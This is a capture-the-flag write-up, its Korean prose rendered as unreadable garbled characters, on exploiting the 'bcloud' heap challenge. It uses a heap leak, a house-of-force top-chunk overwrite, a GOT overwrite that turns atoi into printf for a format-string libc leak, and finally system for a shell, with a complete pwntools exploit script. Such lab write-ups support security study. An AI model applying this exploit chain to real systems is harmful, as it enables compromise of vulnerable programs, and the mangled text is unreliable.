�� ������ house of force����� �̿��� �� �����ε�, format string bug�� trigger�ϴ� ������ �ʿ��ϰ� �����״� �ټ� ���������� �����ϴ� ��մ� ��������.

file

----------

![](https://lh5.googleusercontent.com/FIV_0BSv9zW1O-tQJXfJVPfMbPNO0f_VxKrOrTPTDRE_ekMeJ-Ved3EwoyDkgMQ03cvJ09KfHNZJAHlGckohz6eEYbgP1FtUSbrSAod3xTLr_iVSkr9JH7AcQyNDHa3oz-2JuFby)

ELF 32bit �����̴�.

��ȣ���

----------

![](https://lh6.googleusercontent.com/HUvQvt63qWol71IM5HmJJLOkS779ya4MQIG4hN91vApEAZhzi_b4_UXB6YfeMauIilSUTBHRpOPvMwiL0S5A7g6dt28rPHTokc_syCRDQf-3sqAWcmFbzTVGo6hl4dUTXcB3Ib--)

canary�� nx�� �ɷ��ִ�.

�м�

----------

main�Լ��� ���� ���� while�� ���� �Լ��� ȣ���Ѵ�.

![](https://lh4.googleusercontent.com/RovwjnILZBHQ1rBuHoLZoilao822YmsH3SUbGe3inTmSEXyPYv1_MWh4wVwOvwe0_azMXswOsWsWLuM6NJdyuF3Hdw2SD7S0LgKVC_ONRlot6D86JvoEqrfH3CFUEddNWWmVZogo)

input_name�Լ��� ����

![](https://lh4.googleusercontent.com/O3K-LqbMvgsvQRbTmcE0VpS7b_5OkXNGnIBtbia-IVc94GGPykr0VyBsptWfMoeXsBi0vEJxWuOf--sDHXgTvoNr2QByqyHA5d04hBfaLQ4D9famyjCZQZka_Kd_sCGNNGkwfWRi)

Input your name: �̶�� ������ ��µǰ� input_read �Լ��� ����ȴ�.

![](https://lh3.googleusercontent.com/KAENkEt-hSt5RJinfjjwTQ-HuO7afU0nLl0fKqz3UZ8APfmW_KoOhzY5OCD46dFS9CTTS28nXTftRQHqkmEjbsYrW2wNS5IfLKbz_mlRWEpf22A0O_UYu6gK0La8Q0OO4q7XjSa6)

2��° ���ڱ��� �Է� �ް�, ���๮�ڰ� ���߿� ������ break�Ѵ�.

�ٽ� input_name �Լ��� ���ƿͼ�,

![](https://lh4.googleusercontent.com/Ma-_hAmP-qCsxy5aMgqeaftKkS6oIBs85m9qjPPL9PVU2fPmhLMOBk0OcaS8ThT4yyubdwNTQxR7J4KwLX6NDDUTthoTT09mdtWI8Yk4mtBrJeKpbj_WK0YzgSM9ZvAKzkDGZN8K)

v2 �� 0x40(64) ��ŭ malloc ���ְ� �Է� ���� name�� chunk�� strcpy�� �����Ѵ�.

malloc ������ 64�̰� �Էµ� 64���� ���� �� �ִ�. sub_8048779 �Լ��� ����.

![](https://lh5.googleusercontent.com/b3tCjYYA0cj4Y8ozFNflIJ5RALIOoQVuJSl5NiBArCLKi-j09LRhQ_S-DpCNLR48VsWA67_WpxIenVz7NjQuqyhyeGDRWVTfjYcvZKhClG_H0tauubQx-ro4EbMFA4sqZpjG5848)

%s�� v2�� data�� ������ش�. �Ʊ� �Է��� �� 64�� ä���� �Է��ϸ�, �ڿ� heap base�� leak �ȴ�. ������ ���� ������ ���ڿ��� ���� �ν� ���Ѵ�.

�̸� �̿��ؼ� heap base�� ���ϰ� Top chunk�� �ּҸ� ���� �� �ִ�.

![](https://lh3.googleusercontent.com/fwJX-JZWv1O6E6XlV_BLpAt-w8rrFSTWGajs533D2Nibx7tEa2CEkEEZqZ9SZ2gGfVWVPomMZmI31DzNZVfnj-Qwarc8QHnp_IRYp_q-tpnSosOXV8eF_VJZapLViyvp9j6qFh1D)

sub_804884e �Լ��̴�.

![](https://lh3.googleusercontent.com/Ql0xS7wRu3b86CuI_WK2z_DnWWqgaFKxE-A8P6SxKoRKHVJ1a732pK3n6-SFupH4ZHqh9SKRoJNvpLaxUwaB-Ic3hZFiViS29c9zKHg7dmysR8lTiU_UyfVZVRlhrESE3x0JgmGs)

Org�� &s�� �Է� �ް� Host�� &v3�� �Է� �޴´�.

v4�� v2�� 0x40(64)��ŭ ���ʴ�� �Ҵ� �Ѵ�.

�� ��° malloc chunk�� data���� Host�� strcpy �ȴ�.

������ malloc chunk�� data���� Org�� strcpy �ȴ�.

������ malloc chunk���� data�� 0x40��ŭ �ִ�� ä���ְ� +4��ŭ �� ä��� �� �Է¹����� Top chunk�� control�� �� �ְ� �ȴ�.

�ٵ� �Է��� 64��ŭ �ۿ� �� �޴´�. �ϴ� data�� �� ä�� �� �ְ� �Ǵµ� 8����Ʈ�� �� �Է¹��� �� �־�� Top chunk�� control �� �� �ִ�.

&s�� ��ġ�� ���� bp-0x9c �� ��ġ�� �ִ�. 64��ŭ �Է��� ������ v2 �����Ͱ� �ִ�. ���?

64(data) ��ŭ�� ä��� ���� 4����Ʈ�� ��·�� ���� �� �����״ϱ� overwrite�� �����ϰ� ���� �� ���� 4����Ʈ�� Top chunk �ε�, v3, ��, Host�� ó�� �Է� �޴� 4����Ʈ�� Top chunk�� ���� �� �� �ִ�.

![](https://lh6.googleusercontent.com/GiLU8JO00WsypGJaJAP3oPeJ6FfzaN-bPLSdOecDX89DTuiChNVGFZcP4t0qWCcmOweXRwdgqyl-p47aO7K95nq1yYTpeWwd3WOJRny3puuH7lWb-43tukQ1IKxoaWu1yIXq9P_D)

���� while ���� �ݺ��Ѵ�.

1���� ����.

![](https://lh5.googleusercontent.com/XGP3A3BxRBYYSXJv9pRZzHPTHUbKJPWHjBsM_AOvQCZJB1vKHP3OmD__Sa2wcxd-QASr2dhNntReWcjsOWIPEdXHtts6RwEwqQ_QrVjhRrk-RjRY2jBfsyScDBx5EYsQLUhOBcNv)

v2�� input�� �޴� �� ���� sub_8048709�� ���ڴ�.

![](https://lh3.googleusercontent.com/X5hmFDM3fTFF8weZkMStniH1YFzb1-qOX1PDdCI8JWaD3Lf_Tjlxl16W8Oe7SBxYC16dUQ1OgGF3TwRWq89O7TMg4ZFKa5BH3IsBlrQhH4Kpjf9-nak7LlyXb-x4EZko0BWu4jlS)

���⼭ �� �����ε� input_read�� nptr�� �Է��� �ް�

�̸� atoi�� ���ڷ� �������ش�.

atoi(&nptr)

atou�� got �� printf�� got overwrite�� ���� format string bug�� trigger �� �� �ִ�.

�̸� �̿��� libc�� leak �� �� �ְ� �ȴ�.

�ٽ� ���ƿͼ�,

![](https://lh5.googleusercontent.com/XGP3A3BxRBYYSXJv9pRZzHPTHUbKJPWHjBsM_AOvQCZJB1vKHP3OmD__Sa2wcxd-QASr2dhNntReWcjsOWIPEdXHtts6RwEwqQ_QrVjhRrk-RjRY2jBfsyScDBx5EYsQLUhOBcNv)

�Ʊ� heap overflow�� top chunk�� 0xffffffff�� control�� �� �ְ� �Ǿ���.

���⼭ v2�� atoi�� ���ڸ� �Է� �ް�, v2+4��ŭ malloc�� �Ҵ����ش�.

�� �뿡�� house of force�� ���� ����� Ȯ�� �غ��ڴ�.

1. top chunk�� 0xffffffff�� ������ ������ malloc�� ���ϴ� ��ŭ �Ҵ��� �� �־�� �Ѵ�.

2. malloc size�� ���ϴ� ��ŭ control�� ���ϴ� ���� �Ҵ��ų �� �־�� �Ѵ�.

3. ���ϴ� ���� malloc �� ���� user data�� ��Ʈ���� �����ؾ��Ѵ�. (���� ��� got overwrite)

�����ϴ� house of force ����� �̿��� �����ϸ� �ȴ�.

atoi got�� printf plt�� overwrite�ؾ��Ѵ�.

(atoi got) - (top chunk) - header(8) �� �� ���� �־�� ������ �� ���������� -4��ŭ �� ����

(atoi got) - (top chunk) - header(8) - 4 �� size�� �Ҵ��ؾ��Ѵ�.

�׸��� user data�� �Է��� �� �ٷ� printf plt�� ���°� �ƴ϶� ��AAAA��+p32(printf_plt) �̷��� ����� �Ѵ�.

�̷��� �ϸ� atoi�� printf�� �ٲ� fsb�� ����������.

offset���ϰ� printf_got�ְ� libc leak�ߴ�.

system offset���� �����ְ�,

�ٽ� house of force�� ���� atoi->printf�� �ٲ� atoi_got�� system_got�� �ٲ�� �Ѵ�.

�����ϰԵ� 3���޴����� user data�� ���� �� �� �ִ�.

�ٵ� 3�� �Է��Ϸ��µ� �Է��� �ȵȴ�. �̴�

atoi�� printf�� �ٲ���� ����.

3�̸� ���ڸ� 3�� �̾� ������ send�ϸ� �ȴ�.

��, atoi�� 3�̸� pritnf ��AAA���� ����.

�׷��� �ؼ� �ٽ� AAAA+p32(system)���� �����ְ� nptr�� /bin/sh�� �ٲپ��ָ� ���� ���� �� �ִ�.

libc�� ��� leak�� �� �ִ��� leak vector�� ã�°� �� �߿��� �������� �� ������ ���� ���� ���� ���ؿ� hof ����� ���� ���ص��� ������ �� ���Ƽ� ���� ���� ���� �������� �� ����.

> exploit.py

----------
```python
from pwn import  *

s = process("./bcloud")

e = ELF("./bcloud")

libc = ELF("/lib/i386-linux-gnu/libc.so.6")

#context.log_level = 'debug'

s.recv()

s.send("A"*64)

s.recvuntil("A"*64)

atoi_got = e.got['atoi']

printf_plt = e.plt['printf']

printf_got = e.got['printf']

leak_heap=u32(s.recv()[:4])

heap_base = leak_heap -  0x8

top_chunk = heap_base +  224  # (header(8) + data(64))*3

log.success("leak_heap:"  + hex(heap_base))

log.success("top_chunk:"  + hex(top_chunk))

s.send("B"*64)

s.recvuntil("Host:\n")

s.sendline("\xff\xff\xff\xff")

s.recvuntil(">>\n")

size = atoi_got - top_chunk -  8  -  4

s.sendline("1")

s.recvuntil(":\n")

s.sendline(str(size))

s.recvuntil(">>\n")

s.sendline("1")

s.recvline(":\n")

s.sendline("8")

s.recvline(":\n")

s.sendline("AAAA"+p32(printf_plt))

s.recvuntil(">>\n")

s.sendline("1")

s.recvline(":\n")

payload = p32(printf_got)+"k"+"%6$s"

s.sendline(payload)

s.recvuntil("k")

leak_printf=u32(s.recv()[:4])

log.success(hex(leak_printf))

base = leak_printf - libc.symbols['printf']

log.success(hex(base))

system = base + libc.symbols['system']

log.success(hex(system))

s.sendline("AAA")

s.recv()

s.sendline("333")

s.recv()

s.sendline("1")

s.recv()

s.sendline("AAAA"+p32(system))

s.sendline("/bin/bash")

s.recv()

s.recv()

s.interactive()
```
  

  

![](https://lh3.googleusercontent.com/Jy_cJuQdEI0ZiZHOiqFuAg7h8p2dOft3O-XMYGwZqN4kYjIBvO4lU7sSDXZC3zcW4QMIFJhpB8DZfyFqNn1m4LLZ6SX__P7YBjPFUiKdHI6CLYy03y6HWMGiN2XjRHqYbEtK53Qw)